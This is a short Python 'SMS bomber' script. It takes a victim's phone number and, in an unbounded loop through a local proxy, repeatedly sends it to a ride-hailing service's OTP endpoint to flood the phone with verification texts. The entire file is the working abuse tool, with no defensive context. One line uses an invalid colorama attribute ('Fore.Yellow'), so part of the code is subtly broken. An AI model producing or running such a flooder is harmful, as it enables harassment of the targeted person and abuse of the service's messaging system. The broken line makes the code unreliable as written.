#Made_By_Defalt

import requests
from colorama import init, Fore



print(Fore.Yellow + 'You must run your proxy in 8000 port ')
# Initialize Colorama
init()

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
data = {
    'cellphone': input('Enter the cell number: ')
}

# Proxy server configuration
proxy_ip = '127.0.0.1'
proxy_port = '8000'
proxies = {
    'http': f'http://{proxy_ip}:{proxy_port}',
    'https': f'http://{proxy_ip}:{proxy_port}'
}

while True:
    # Make the POST request with the proxy server
    response = requests.post(url, headers=headers, data=data, proxies=proxies)

    # Check the response status code
    if response.status_code == 200:
        # Print success message in green
        print(Fore.GREEN + 'SMS Sent :)')
    else:
        # Print error message in red
        print(Fore.RED + 'Error :(')
